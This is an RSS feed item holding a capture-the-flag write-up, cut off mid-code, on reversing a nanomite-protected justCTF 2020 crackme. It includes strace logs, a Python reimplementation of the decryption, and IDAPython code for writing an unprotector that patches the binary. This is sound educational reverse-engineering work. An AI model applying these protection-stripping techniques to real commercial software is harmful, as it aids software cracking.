<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>mrT4ntr4&#39;s Blog</title>
    <link>https://mrt4ntr4.github.io/</link>
    
    <atom:link href="https://mrt4ntr4.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Thu, 04 Feb 2021 04:58:06 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>justCTF 2020 [debug_me_if_you_can-RE]</title>
      <link>https://mrt4ntr4.github.io/JustCTF-debugme/</link>
      <guid>https://mrt4ntr4.github.io/JustCTF-debugme/</guid>
      <pubDate>Tue, 02 Feb 2021 22:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/justctf/thumb.PNG" title="banner" class="gallery-item"><img src="/img/justctf/thumb.PNG" alt="banner"></a></p><p>I had some time over the weekend and decided to try some reversing challenges from justCTF[*] 2020. Although I didn’t participate in the ctf seriously but solved an interesting challenge which deserves a writeup for sure.  </p><hr><h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><blockquote><p>I bet you can’t crack this binary protected with my custom bl33d1ng edg3 pr0t3c70r!!!111oneoneone<br><strong>Download :</strong> <a href="/files/justctf/supervisor"  target="_blank">supervisor</a> <a href="/files/justctf/crackme.enc"  target="_blank">crackme.enc</a> <a href="/files/justctf/flag.png.enc"  target="_blank">flag.png.enc</a></p></blockquote><hr><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><ul><li>Protector uses Nanomite technique </li><li>Using strace to analyse execution</li><li>Code is decrypted on the fly and then again encrypted</li><li>Rebuilding a clean unprotected binary with IdaPython</li><li>Keygenning</li></ul><hr><h1 id="Role-of-Father-Process"><a href="#Role-of-Father-Process" class="headerlink" title="Role of Father Process"></a>Role of Father Process</h1><p>The crackme.enc binary is encrypted. I tried forcing some of it to code but that didn’t help me enough. So it looks that it is only encrypted at some marked positions in the function. Also that int3 looks suspicious.  </p><p><a href="/img/justctf/child_main_enc.PNG" title="child_main_enc" class="gallery-item"><img src="/img/justctf/child_main_enc.PNG" alt="child_main_enc"></a></p><p>So I shifted my focus to another binary from the provided files ie. supervisor. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $.&#x2F;supervisor</span><br><span class="line">Hello there!</span><br><span class="line">Error! https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Khk6SEQ-K-k</span><br><span class="line">0xCCya!</span><br><span class="line">: No such process</span><br></pre></td></tr></table></figure><p>supervisor begins by initializing some data. Later it forks a child process and executes crackme.enc with <code>ptrace(PTRACE_TRACEME)</code> which means that crackme.enc is being traced by the supervisor.  </p><p><a href="/img/justctf/supervisor_main.PNG" title="supervisor_main" class="gallery-item"><img src="/img/justctf/supervisor_main.PNG" alt="supervisor_main"></a></p><p>The child logic starts with continuing the child process until it encounters an interrupt.. ahh ok!. So simply after an interrupt is generated it transfers control to the father and father handles its execution from that point.<br>This is a typical case of nanomite.<br><a href="https://www.apriorit.com/white-papers/293-nanomite-technology">https://www.apriorit.com/white-papers/293-nanomite-technology</a></p><p>Later it gets the rip from the child’s interrupt context and peeks 4 bytes from it. These can be either <code>13 37 BA BE</code> or <code>DE AD C0 DE</code> and exits if it is neither of them.<br>If <code>13 37 BA BE</code>, then it also peeks the other 4 bytes in succession.  </p><p>Also if you aren’t much familiar with ptrace flags I recommend you to read this :<br><a href="https://www.linuxjournal.com/article/6100">https://www.linuxjournal.com/article/6100</a>  </p><p><a href="/img/justctf/supervisor1.PNG" title="supervisor1" class="gallery-item"><img src="/img/justctf/supervisor1.PNG" alt="supervisor1"></a></p><p>Then it notes the address of first occurences of bytes <code>FE ED C0 DE</code> and <code>DE AD C0 DE</code>. </p><p><a href="/img/justctf/supervisor2.PNG" title="supervisor2" class="gallery-item"><img src="/img/justctf/supervisor2.PNG" alt="supervisor2"></a></p><p>It is often useful to display opcodes bytes along with the disassembly in IDA, especially in cases like these.<br><strong>Options -&gt; General -&gt; Disassembly -&gt; Number of opcode bytes (non-graph)</strong></p><p>Now it decrypts some specific bytes after the noted <code>FE ED C0 DE</code> address, sets rip to it and continues execution.</p><p><a href="/img/justctf/supervisor3.PNG" title="supervisor3" class="gallery-item"><img src="/img/justctf/supervisor3.PNG" alt="supervisor3"></a></p><p>So we arrive at the following code block structure:</p><p><a href="/img/justctf/codeblock.PNG" title="codeblock" class="gallery-item"><img src="/img/justctf/codeblock.PNG" alt="codeblock"></a></p><hr><h1 id="Tracing-Execution-with-strace"><a href="#Tracing-Execution-with-strace" class="headerlink" title="Tracing Execution with strace"></a>Tracing Execution with strace</h1><p>The execution flow can simply be traced with the help of strace. Since it does all of the work with ptrace we see a lot of calls in strace output.<br>As we found out through static analysis, it starts off by comparing 4 bytes after an interrupt with <code>1337BABE</code>, and looks out for <code>FEEDC0DE</code> and <code>DEADC0DE</code> afterwards.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">wait4(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>)                = <span class="number">5962</span></span><br><span class="line">--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=<span class="number">5962</span>, si_uid=<span class="number">1000</span>, si_status=SIGTRAP, si_utime=<span class="number">0</span>, si_stime=<span class="number">0</span>&#125; ---</span><br><span class="line">ptrace(PTRACE_CONT, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0</span>)      = <span class="number">0</span></span><br><span class="line">wait4(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>)                = <span class="number">5962</span></span><br><span class="line">--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=<span class="number">5962</span>, si_uid=<span class="number">1000</span>, si_status=SIGTRAP, si_utime=<span class="number">0</span>, si_stime=<span class="number">0</span>&#125; ---</span><br><span class="line">ptrace(PTRACE_GETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line"><span class="comment">//v18 = ptrace(PTRACE_PEEKTEXT, c_pid, v19, 0LL);</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7dd</span>, [<span class="number">0x909003011337babe</span>]) = <span class="number">0</span></span><br><span class="line"><span class="comment">//v17 = ptrace(PTRACE_PEEKTEXT, c_pid, v19 + 4, 0LL);</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e1</span>, [<span class="number">0x9090909090900301</span>]) = <span class="number">0</span></span><br><span class="line"><span class="comment">//v16 = peek_until_match(c_pid, v19, 0xFEEDC0DELL) + 4; </span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7dd</span>, [<span class="number">0x909003011337babe</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7de</span>, [<span class="number">0x90909003011337ba</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7df</span>, [<span class="number">0x9090909003011337</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e0</span>, [<span class="number">0x9090909090030113</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e1</span>, [<span class="number">0x9090909090900301</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e2</span>, [<span class="number">0x9090909090909003</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e3</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e4</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e5</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e6</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e7</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e8</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7e9</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7ea</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7eb</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7ec</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7ed</span>, [<span class="number">0x9090909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7ee</span>, [<span class="number">0xde90909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7ef</span>, [<span class="number">0xc0de909090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f0</span>, [<span class="number">0xedc0de9090909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f1</span>, [<span class="number">0xfeedc0de90909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f2</span>, [<span class="number">0x48feedc0de909090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f3</span>, [<span class="number">0x8d48feedc0de9090</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f4</span>, [<span class="number">0x3d8d48feedc0de90</span>]) = <span class="number">0</span></span><br><span class="line"><span class="comment">//found feedc0de</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7f5</span>, [<span class="number">0x8d3d8d48feedc0de</span>]) = <span class="number">0</span></span><br><span class="line"><span class="comment">//v7 = peek_until_match(c_pid, v19, 0xDEADC0DELL);</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b7dd</span>, [<span class="number">0x909003011337babe</span>]) = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>Also if the 4 bytes after an interrupt is <code>DEADCODE</code> it starts encrypting the code previously decrypted. <code>PTRACE_PEEKTEXT</code> and <code>PTRACE_POKETEXT</code> are used consecutively for decryption/encryption.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_GETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b39a</span>, [<span class="number">0x9090aabb1337babe</span>]) = <span class="number">0</span>  <span class="comment">//decryption</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b39e</span>, [<span class="number">0x909090909090aabb</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3b9</span>, [<span class="number">0x5bb0b08e0fb609f6</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3b9</span>, <span class="number">0xb0335b0de435e275</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3bd</span>, [<span class="number">0xc0410636b0335b0d</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3bd</span>, <span class="number">0x28c1eeb658b3b38d</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3c4</span>, [<span class="number">0xe86a15c4607e2828</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3c4</span>, <span class="number">0x1ebfc4589ffc1a9</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3ba</span>, [<span class="number">0xb658b3b38de435e2</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3ba</span>, <span class="number">0x3bbd3e560001b807</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3be</span>, [<span class="number">0xc1a9c1ee3bbd3e56</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3be</span>, <span class="number">0xffffffb805eb0000</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_GETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_SETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_CONT, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0</span>)      = <span class="number">0</span></span><br><span class="line">--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=<span class="number">5962</span>, si_uid=<span class="number">1000</span>, si_status=SIGTRAP, si_utime=<span class="number">0</span>, si_stime=<span class="number">0</span>&#125; ---</span><br><span class="line">wait4(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>)                = <span class="number">5962</span></span><br><span class="line">ptrace(PTRACE_GETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3ce</span>, [<span class="number">0x5dfc458bdeadc0de</span>]) = <span class="number">0</span>  <span class="comment">//encryption</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3b9</span>, [<span class="number">0xeb00000001b80775</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3b9</span>, <span class="number">0x88eb88ea30ecfd</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3bd</span>, [<span class="number">0xffffb8050088eb88</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3bd</span>, <span class="number">0x1774508ee8030303</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3c4</span>, [<span class="number">0x1ebfc4589ffff17</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3c4</span>, <span class="number">0xe86115cf6075169d</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3ba</span>, [<span class="number">0x8ee8030303ea30ec</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3ba</span>, <span class="number">0x3068eed8e04bd02</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_PEEKTEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3be</span>, [<span class="number">0x169d745003068eed</span>]) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_POKETEXT, <span class="number">5962</span>, <span class="number">0x56468f86b3be</span>, <span class="number">0x28c04a0d3d5bb0b0</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_GETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br><span class="line">ptrace(PTRACE_SETREGS, <span class="number">5962</span>, <span class="literal">NULL</span>, <span class="number">0x7ffdd357e660</span>) = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>So the final code flow can be depicted as follows:</p><p><a href="/img/justctf/flow_poketext.PNG" title="flow_poketext" class="gallery-item"><img src="/img/justctf/flow_poketext.PNG" alt="flow_poketext"></a>  </p><hr><h1 id="Analysing-Decryption-Algorithm"><a href="#Analysing-Decryption-Algorithm" class="headerlink" title="Analysing Decryption Algorithm"></a>Analysing Decryption Algorithm</h1><p>The decryption algorithm is simple indeed!</p><p>It uses the qwords initialised earlier and references those according to the two specific bytes after <code>13 37 BA BE</code>.<br>Each decryption cycle uses 5 specific qwords at a time.  </p><p>The layout is as follows :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5607d9b68d60</span> <span class="number">0x0000000000007777</span></span><br><span class="line"><span class="number">0x5607d9b68d68</span> <span class="number">0x0000000700000018</span></span><br><span class="line"><span class="number">0x5607d9b68d70</span> <span class="number">0x0000000000000008</span></span><br><span class="line"><span class="number">0x5607d9b68d78</span> <span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x5607d9b68d80</span> <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5607d9b68d88</span> <span class="number">0x0000000000007777</span></span><br><span class="line"><span class="number">0x5607d9b68d90</span> <span class="number">0x0000007000000018</span></span><br><span class="line"><span class="number">0x5607d9b68d98</span> <span class="number">0x0000000000000008</span></span><br><span class="line"><span class="number">0x5607d9b68da0</span> <span class="number">0x0000000000000042</span></span><br><span class="line"><span class="number">0x5607d9b68da8</span> <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>Here is the psuedocode implemented in python :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dec_key_data = [<span class="number">0x0000000000000301</span>,</span><br><span class="line">                <span class="number">0x0000000700000018</span>,</span><br><span class="line">                <span class="number">0x0000000000000008</span>,</span><br><span class="line">                <span class="number">0x0000000000000041</span>,</span><br><span class="line">                <span class="number">0x0000000000000000</span>]</span><br><span class="line"></span><br><span class="line">crackme_bytes = <span class="number">0xffffffffbdb809a8</span></span><br><span class="line"></span><br><span class="line">xor_elem = (dec_key_data[<span class="number">0</span>] + dec_key_data[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">x = dec_key_data[<span class="number">3</span>] ^ (xor_elem &amp; <span class="number">0xff</span>)  </span><br><span class="line">y = dec_key_data[<span class="number">3</span>] ^ (xor_elem &gt;&gt; <span class="number">8</span>)     </span><br><span class="line"></span><br><span class="line">xor_res = x ^ (y&lt;&lt;<span class="number">8</span>)\</span><br><span class="line">        ^ (x &lt;&lt; <span class="number">16</span>) ^ (y &lt;&lt; <span class="number">24</span>)\</span><br><span class="line">        ^ (x &lt;&lt; <span class="number">32</span>) ^ (y &lt;&lt; <span class="number">40</span>)\</span><br><span class="line">        ^ (x &lt;&lt; <span class="number">48</span>) ^ (y &lt;&lt; <span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">dec_bytes = crackme_bytes ^ xor_res</span><br><span class="line">print(<span class="built_in">hex</span>(dec_bytes))   <span class="comment">#0xbdbfbdbffff84be8</span></span><br></pre></td></tr></table></figure><hr><h1 id="Writing-an-Unprotector"><a href="#Writing-an-Unprotector" class="headerlink" title="Writing an Unprotector"></a>Writing an Unprotector</h1><p>I thought of several ways to approach it such as :</p><ul><li>Patching encryption function call in supervisor and use strace</li><li>Use a regex to filter out the good bytes from the strace log</li><li>Use IDAPython to patch some bytes and unprotect it</li><li>Use emulation to only decrypt code</li></ul><p>For the first one, its not that easy there’s a catch, simply patching the encryption call will not work as the decryption key is also generated from the encrypted bytes afterwards.<br>The second one stands out as it will surely give us the flag easily but its not fun and not the best way to solve it imo.<br>The last two would require us to understand the decryption process as well but will help us in the long run if we are given another binary protected with the same fancy bl33d1ng edg3 pr0t3c70r!!!<br>I’ll use the third one here.  </p><p>We begin by finding all the 1337babes in the text section.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_1337babes</span>():</span></span><br><span class="line">    res = []</span><br><span class="line">    ea = idaapi.get_segm_by_name(<span class="string">&#x27;.text&#x27;</span>).startEA</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found_addr = FindBinary(ea, SEARCH_NEXT|SEARCH_DOWN, <span class="string">&quot;BE BA 37 13&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> found_addr != <span class="number">0xFFFFFFFFFFFFFFFF</span>:</span><br><span class="line">            res.append(found_addr)</span><br><span class="line">            ea = found_addr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>Those 1337babes addresses are used for identifying a code block as encrypted and then we look for first occurences of feedc0de and deadc0de.<br>I also wrote a short script to dump the qwords data from the supervisor binary.<br>Then we mark the addresses to be patched by our decrypt function.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch_addr = leetbabe_addr + <span class="number">4</span> + (qword[<span class="number">1</span>] &amp; <span class="number">0xff</span>) + (qword[<span class="number">1</span>] &gt;&gt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>And at the end we replace useless bytes with nops.  </p><p>The patching function is as follows : </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_patch</span>(<span class="params">leetbabes</span>):</span></span><br><span class="line">    dec_key_data = [[<span class="string">&#x27;0x7777&#x27;</span>, <span class="string">&#x27;0x700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x7777&#x27;</span>, <span class="string">&#x27;0x7000000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x7777&#x27;</span>, <span class="string">&#x27;0xdb00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x7777&#x27;</span>, <span class="string">&#x27;0x3b00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x7777&#x27;</span>, <span class="string">&#x27;0xa300000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x707&#x27;</span>, <span class="string">&#x27;0x700000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x707&#x27;</span>, <span class="string">&#x27;0x800000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x707&#x27;</span>, <span class="string">&#x27;0xb00000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x707&#x27;</span>, <span class="string">&#x27;0x700000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x707&#x27;</span>, <span class="string">&#x27;0x700000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span 